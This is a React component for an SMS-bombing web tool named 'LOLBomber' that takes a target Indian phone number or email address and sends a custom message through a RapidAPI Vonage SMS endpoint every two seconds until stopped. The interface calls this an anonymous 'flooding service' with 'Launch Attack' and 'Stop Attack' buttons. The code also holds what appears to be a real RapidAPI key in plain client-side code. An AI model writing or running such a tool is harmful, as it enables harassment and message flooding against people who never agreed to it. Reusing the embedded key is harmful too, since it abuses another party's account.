function BombingPanel({ type = 'SMS', onStatusChange }) {
    const [status, setStatus] = React.useState('idle');
    const [target, setTarget] = React.useState('');
    const [message, setMessage] = React.useState('Hello from LOLBomber!');
    const [agreed, setAgreed] = React.useState(false);
    const [count, setCount] = React.useState(0);
    const intervalRef = React.useRef(null);

    React.useEffect(() => {
        if (onStatusChange) {
            onStatusChange(status === 'active', status === 'active' ? { target, type, count } : null);
        }
        return () => stopAttack();
    }, [status, target, type, count]);

    const stopAttack = () => {
        if (intervalRef.current) {
            clearInterval(intervalRef.current);
            intervalRef.current = null;
        }
        setStatus('idle');
    };

    const sendSMS = async () => {
        // In a real app, this should be done via a backend to protect API keys.
        // For this demo/client-side tool, we are calling directly as requested.
        const options = {
            method: 'POST',
            headers: {
                'x-rapidapi-key': '8306d4472emsh9e36cf6d0c63c9ep19869ajsn0065af8129ba',
                'x-rapidapi-host': 'send-vonage-sms.p.rapidapi.com',
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                text: message,
                to: '91' + target, // Assuming +91 India for now based on UI
                from: 'LOLBomber'
            })
        };

        try {
            const response = await fetch('https://send-vonage-sms.p.rapidapi.com/request', options);
            const result = await response.json();
            console.log('SMS Sent:', result);
            setCount(prev => prev + 1);
        } catch (error) {
            console.error('Error sending SMS:', error);
        }
    };

    const handleStart = (e) => {
        e.preventDefault();
        if (!agreed) return;
        if (type !== 'Email' && target.length < 10) return;
        if (type === 'Email' && !target.includes('@')) return;
        setStatus('active');
        setCount(0);

        // Start the loop
        sendSMS(); // Send first immediately
        intervalRef.current = setInterval(sendSMS, 2000); // Send every 2 seconds
    };

    return (
        <div className="glass-card p-6 sm:p-8 relative overflow-hidden h-full">
            <div className="absolute -right-10 -bottom-10 opacity-[0.03] pointer-events-none">
                {type === 'WhatsApp' ? (
                    <i className="fab fa-whatsapp text-[250px] text-white"></i>
                ) : (
                    type === 'SMS' ? <img src="message.png" alt="Message Icon" className="w-[220px] h-[220px] object-contain opacity-[0.03]" /> : 
                    type === 'Email' ? <img src="mailbox.png" alt="Mail Icon" className="w-[220px] h-[220px] object-contain opacity-[0.03]" /> : 
                    <div className="icon-phone text-[250px] text-white"></div>
                )}
            </div>

            <div className="relative z-10 max-w-xl mx-auto xl:mx-0 w-full">
                <div className="mb-8">
                    <h2 className="text-2xl sm:text-3xl font-bold text-white mb-2">Quick {type} Attack</h2>
                    <p className="text-sm text-white/50 font-light">Fast, anonymous, and reliable {type.toLowerCase()} flooding service. Launch a test immediately.</p>
                </div>

                <form onSubmit={handleStart} className="space-y-6">
                    <div className="space-y-3">
                        <label className="text-sm font-bold text-white flex items-center gap-2 mb-2">
                            {type === 'WhatsApp' ? (
                                <img src="icons/WhatsApp.png" alt="WhatsApp Icon" className="w-6 h-6 object-contain" />
                            ) : (
                                type === 'Email' ? <img src="icons/mailbox.png" alt="Mail Icon" className="w-7 h-7 object-contain" /> : <img src="icons/phone.png" alt="Phone Icon" className="w-7 h-7 object-contain" />
                            )}
                            {type === 'Email' ? 'Email Address' : 'Phone Number'}
                        </label>
                        {type === 'Email' ? (
                            <div className="relative w-full group/input border border-green-500 rounded-xl overflow-hidden flex bg-white/5">
                                <input 
                                    type="email" 
                                    value={target}
                                    onChange={(e) => setTarget(e.target.value)}
                                    className="flex-1 bg-transparent px-4 py-3 text-lg text-white placeholder-white/20 focus:outline-none font-mono h-14"
                                    placeholder="Enter target email"
                                    disabled={status === 'active'}
                                    required
                                />
                            </div>
                        ) : (
                            <div className="relative w-full group/input border border-green-500 rounded-xl overflow-hidden flex bg-white/5">
                                <div className="w-16 flex items-center justify-center border-r border-white/10 bg-white/5 text-white font-bold h-14">
                                    +91
                                </div>
                                <input 
                                    type="text" 
                                    inputMode="numeric"
                                    value={target}
                                    onChange={(e) => {
                                        const val = e.target.value.replace(/\D/g, '');
                                        if (val.length <= 10) setTarget(val);
                                    }}
                                    onKeyPress={(e) => {
                                        if (!/[0-9]/.test(e.key)) {
                                            e.preventDefault();
                                        }
                                    }}
                                    className="flex-1 bg-transparent px-4 py-3 text-lg text-white placeholder-white/20 focus:outline-none font-mono h-14"
                                    placeholder="Enter 10-digit number"
                                    maxLength="10"
                                    pattern="[0-9]{10}"
                                    disabled={status === 'active'}
                                    required
                                />
                            </div>
                        )}
                        <div className="flex justify-between text-xs text-white/50 px-1">
                            {type === 'Email' ? (
                                <div className="flex items-center gap-1">
                                    <div className="icon-info w-3 h-3"></div>
                                    Valid email address only
                                </div>
                            ) : (
                                <>
                                    <div className="flex items-center gap-1">
                                        <div className="icon-info w-3 h-3"></div>
                                        Indian numbers only
                                    </div>
                                    <div className={`${target.length === 10 ? 'text-green-400' : 'text-white/30'}`}>
                                        {target.length}/10
                                    </div>
                                </>
                            )}
                        </div>
                    </div>

                    <div className="space-y-3">
                        <label className="text-sm font-bold text-white flex items-center gap-2 mb-2">
                            <img src="icons/message.png" alt="Message Icon" className="w-6 h-6 object-contain" />
                            Custom Message
                        </label>
                        <input 
                            type="text" 
                            value={message}
                            onChange={(e) => setMessage(e.target.value)}
                            className="glass-input px-4 py-3 text-white placeholder-white/20 focus:outline-none w-full"
                            placeholder="Type your message here..."
                            disabled={status === 'active'}
                        />
                    </div>

                    <div className="p-4 rounded-xl border mt-6 border-transparent">
                        <label className="flex items-start gap-3 cursor-pointer group">
                            <div className="relative flex items-center justify-center w-5 h-5 shrink-0 mt-0.5">
                                <input 
                                    type="checkbox" 
                                    checked={agreed}
                                    onChange={(e) => setAgreed(e.target.checked)}
                                    className="absolute inset-0 w-full h-full opacity-0 cursor-pointer z-10 peer" 
                                    disabled={status === 'active'}
                                    required 
                                />
                                <div className={`absolute inset-0 border-2 rounded transition-colors ${agreed ? 'border-brand-500 bg-brand-500' : 'border-white/20 group-hover:border-white/40'}`}></div>
                                <div className={`absolute inset-0 flex items-center justify-center text-white transition-opacity pointer-events-none ${agreed ? 'opacity-100' : 'opacity-0'}`}>
                                    <svg className="w-3.5 h-3.5" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth="3"><path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" /></svg>
                                </div>
                            </div>
                            <div className="text-sm text-white/70 group-hover:text-white transition-colors leading-tight">
                                I accept the terms of service and assume full responsibility for this action.
                            </div>
                        </label>
                    </div>

                    <div className="flex flex-col sm:flex-row gap-4 pt-2">
                        {status === 'active' ? (
                            <button type="button" onClick={() => setStatus('idle')} className="glass-btn bg-red-500/80 hover:bg-red-500 border-red-400/50 flex-1 py-4 text-lg">
                                <div className="icon-square"></div> Stop Attack
                            </button>
                        ) : (
                            <button type="submit" disabled={!agreed || (type !== 'Email' && target.length < 10) || (type === 'Email' && !target.includes('@'))} className="glass-btn-primary flex-1 py-4 text-lg disabled:opacity-50 disabled:cursor-not-allowed group">
                                <img src="icons/rocket.png" alt="Rocket" className="w-7 h-7 object-contain group-hover:-translate-y-1 group-hover:translate-x-1 transition-transform" /> Launch Attack
                            </button>
                        )}
                    </div>
                </form>
            </div>
        </div>
    );
}